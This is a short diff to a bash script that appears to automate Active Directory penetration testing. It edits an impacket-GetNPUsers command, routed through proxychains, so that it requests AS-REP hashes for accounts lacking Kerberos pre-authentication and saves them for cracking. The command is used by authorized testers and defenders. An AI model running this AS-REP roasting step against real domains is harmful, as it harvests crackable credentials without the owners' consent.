@@ -1434,7 +1434,7 @@ asp (){
 			unset KRB5CCNAME
 			rm ${Username}.ccache
 		else
-			$proxychains impacket-GetNPUsers -no-pass -usersfile ${DIR}/users.txt $domain/ -outputfile $DIR_VULNS/krb/asreproasting_Users.txt > /dev/null 2>&1
+			$proxychains impacket-GetNPUsers -dc-ip $DC_ip -no-pass -request -usersfile ${DIR}/users.txt $domain/ -outputfile $DIR_VULNS/krb/asreproasting_Users.txt > /dev/null 2>&1
 		fi
 		if grep -q 'asrep' "$DIR_VULNS/krb/asreproasting_Users.txt"; then
 			green_log "${SPACE}[💀] Great, there are asreproastable accounts found -> $DIR_VULNS/krb/asreproasting_Users.txt"
